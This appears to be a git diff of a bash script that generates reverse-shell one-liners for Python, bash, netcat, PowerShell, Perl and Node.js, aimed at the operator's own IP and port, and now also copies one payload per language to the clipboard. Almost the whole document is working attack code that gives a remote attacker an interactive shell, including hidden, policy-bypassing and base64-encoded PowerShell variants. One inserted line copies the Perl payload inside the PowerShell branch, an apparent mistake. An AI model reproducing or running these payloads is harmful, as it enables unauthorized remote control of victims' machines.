@@ -10,7 +10,7 @@ ip=$(/sbin/ip -o -4 addr list $interface | awk '{print $4}' | cut -d/ -f1)
 
 if [ -z $1 ]
 then
-	echo "usage: shell <python|bash|nc|ps|perl|nodejs>"
+	echo "usage: shellc <python|bash|nc|ps|perl|nodejs>"
 	exit
 fi
 
@@ -19,22 +19,28 @@ echo ""
  
 if [ $1 == "python" ]
 then
-	echo -e "${RED}[+]${NC} Python 3:"
-	echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
-	echo ""
-
-	echo -e "${RED}[+]${NC} Python 3 shorter:"
+	echo -e "${RED}[+]${NC} Python 3 shorter (${GREEN}Copied${NC})"
 	echo "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"$ip\",$port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"
 	echo ""
 
-	echo -e "${RED}[+]${NC} Python:"
+	# Copy
+	echo "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"$ip\",$port));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'" | xclip -selection c
+
+	echo -e "${RED}[+]${NC} Python 3"
+	echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
+	echo ""
+
+	echo -e "${RED}[+]${NC} Python"
 	echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
 fi
 if [ $1 == "bash" ]
 then
-	echo -e "${RED}[+]${NC} bash -i"
+	echo -e "${RED}[+]${NC} bash -i (${GREEN}Copied${NC})"
 	echo "/bin/bash -i >& /dev/tcp/$ip/$port 0>&1"
 	echo ""
+	
+	# Copy
+	echo "/bin/bash -i >& /dev/tcp/$ip/$port 0>&1" | xclip -selection c
 
 	echo -e "${RED}[+]${NC} bash 196"
 	echo "0<&196;exec 196<>/dev/tcp/$ip/$port; /bin/bash <&196 >&196 2>&196"
@@ -54,9 +60,12 @@ then
 fi
 if [ $1 == "nc" ]
 then
-	echo -e "${RED}[+]${NC} nc mkfifo"
+	echo -e "${RED}[+]${NC} nc mkfifo (${GREEN}Copied${NC})"
 	echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $ip $port >/tmp/f"
 	echo ""
+
+	# Copy
+	echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $ip $port >/tmp/f" | xclip -selection c
 
 	echo -e "${RED}[+]${NC} nc standard"
 	echo "nc -e /bin/bash $ip $port"
@@ -64,13 +73,17 @@ fi
 
 if [ $1 == "ps" ]
 then
-	echo -e "${RED}[+]${NC} powershell 1"
+	echo -e "${RED}[+]${NC} powershell 1 (${GREEN}Copied${NC})"
 	echo 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("'$ip'",'$port');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
 	echo ""
 
+	# Copy
+	echo 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("'$ip'",'$port');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | xclip -selection c
+
 	echo -e "${RED}[+]${NC} powershell 2"
 	echo "powershell -nop -W hidden -noni -ep bypass -c \"\$TCPClient = New-Object Net.Sockets.TCPClient('$ip', $port);\$NetworkStream = \$TCPClient.GetStream();\$StreamWriter = New-Object IO.StreamWriter(\$NetworkStream);function WriteToStream (\$String) {[byte[]]\$script:Buffer = 0..\$TCPClient.ReceiveBufferSize | % {0};\$StreamWriter.Write(\$String + 'SHELL> ');\$StreamWriter.Flush()}WriteToStream '';while((\$BytesRead = \$NetworkStream.Read(\$Buffer, 0, \$Buffer.Length)) -gt 0) {\$Command = ([text.encoding]::UTF8).GetString(\$Buffer, 0, \$BytesRead - 1);\$Output = try {Invoke-Expression \$Command 2>&1 | Out-String} catch {\$_ | Out-String}WriteToStream (\$Output)}\$StreamWriter.Close()\""
-	echo ""
+	echo ""	# Copy
+	echo "perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"$ip:$port\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'" | xclip -selection c
 
 	echo -e "${RED}[+]${NC} powershell b64 encoded"
 	enc=`echo -n '$client = New-Object System.Net.Sockets.TCPClient("'$ip'",'$port');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | base64 -w 0`
@@ -79,14 +92,21 @@ fi
 
 if [ $1 == "nodejs" ]
 then
-	echo -e "${RED}[+]${NC} nodejs"
+	echo -e "${RED}[+]${NC} nodejs (${GREEN}Copied${NC})"
 	echo "require('child_process').exec('nc -e /bin/bash $ip $port')"
+
+	# Copy
+	echo "require('child_process').exec('nc -e /bin/bash $ip $port')" | xclip -selection c
 fi
 
 if [ $1 == "perl" ]
 then
-	echo -e "${RED}[+]${NC} perl"
+	echo -e "${RED}[+]${NC} perl (${GREEN}Copied${NC})"
 	echo "perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"$ip:$port\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'"
+
+	# Copy
+	echo "perl -MIO -e '\$p=fork;exit,if(\$p);\$c=new IO::Socket::INET(PeerAddr,\"$ip:$port\");STDIN->fdopen(\$c,r);$~->fdopen(\$c,w);system\$_ while<>;'" | xclip -selection c
+
 fi
 
 
